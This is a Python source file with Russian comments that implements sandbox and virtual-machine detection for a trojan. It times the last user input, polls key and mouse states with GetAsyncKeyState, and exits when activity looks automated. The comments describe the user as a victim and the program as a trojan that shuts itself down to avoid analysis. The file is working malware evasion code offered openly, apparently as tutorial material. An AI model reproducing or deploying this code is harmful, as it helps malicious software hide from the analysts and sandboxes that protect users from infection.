"""код для обнаружения виртуальных сред"""
from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api


class LASTINPUTINFO(Structure):
    """LASTINPUTINFO для хранения временной метки (в миллисекундах), обозначающей момент обнаружения последнего события
     ввода в системе. """
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]


def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))  # GetLastInputInfo, присваивает полю struct_lastinputinfo.dwTime временную метку
    run_time = windll.kernel32.GetTickCount()  # как долго проработала система
    elapsed = run_time - struct_lastinputinfo.dwTime    # Переменная elapsed должна быть равна разности между временем
                                                        # работы системы и временем последнего ввода
    print(f"[*] It's been {elapsed} milliseconds since the last event.")
    return elapsed


class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    def get_key_press(self):
        """Метод get_key_press определяет количество щелчков кнопкой мыши, когда они были
            сделаны и сколько раз наша жертва нажала клавиши на клавиатуре"""
        for i in range(0, 0xff):  # перебираем диапазон допустимых клавиш ввода
            state = win32api.GetAsyncKeyState(i)  #  и проверяем каждую из них на предмет нажатия путем вызова функции GetAsyncKeyState
            if state & 0x0001: # Если клавиша находится в нажатом состоянии (выражение state & 0x0001 истинно)
                if i == 0x1: # то проверяем, равно ли 0x1 ее значение, соответствующее виртуальному коду щелчка левой кнопкой мыши
                    self.mouse_clicks += 1  # инкрементируем общее количество щелчков
                    return time.time()      # возвращаем текущую временную метку, чтобы позже рассчитать время
                elif i > 32 and i < 127:  #  проверяем, нажаты ли на клавиатуре клавиши с печатаемыми символами (ASCII)
                    self.keystrokes += 1  # если да, то просто инкрементируем общее количество зафиксированных нажатий клавиш.
        return None

    def detect(self):
        """, сколько нажатий клавиш, щелчков кнопкой мыши и двойных щелчков должно произойти, прежде чем  мы решим,
        что код выполняется за пределами виртуального окружения. """
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        max_double_clicks = 10
        max_keystrokes = random.randint(10, 25)
        max_mouse_clicks = random.randint(5, 25)
        max_input_threshold = 30000

        last_input = get_last_input()   # После этого мы узнаем, сколько времени прошло с момента, когда пользовательский ввод в последний раз был зарегистрирован в системе , и если этот
                                        # период кажется слишком длинным (с учетом того, каким образом мы заразили компьютер, о чем уже упоминалось ранее), прекращаем работу трояна.
        if last_input >= max_input_threshold:
            sys.exit(0)

        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press()  # проверяем, нажата ли клавиша на клавиатуре или кнопка мыши,
                        #зная, что если функция вернет значение, это будет временная метка соответствующего события.

            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp  # считаем, сколько времени прошло между щелчками кнопкой мыши
                if elapsed <= double_click_threshold: # сравниваем результат с пороговым значением чтобы понять, был ли это двойной щелчок
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        """Помимо двойных щелчков пытаемся распознать ситуации, когда оператор виртуального окружения
                         генерирует поток событий мыши  в попытке обойти наши механизмы обнаружения. 
                         Например, было бы странно увидеть 100 двойных щелчков подряд при нормальном использовании компьютера"""
                        if self.double_clicks >= max_double_clicks:
                            if (keypress_time - first_double_click <= (max_double_clicks * double_click_threshold)):
                                sys.exit(0)
                if (self.keystrokes >= max_keystrokes and
                    self.double_clicks >= max_double_clicks and
                    self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True
                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time


if __name__ == '__main__':
    d = Detector()
    d.detect()
    print('okay.')
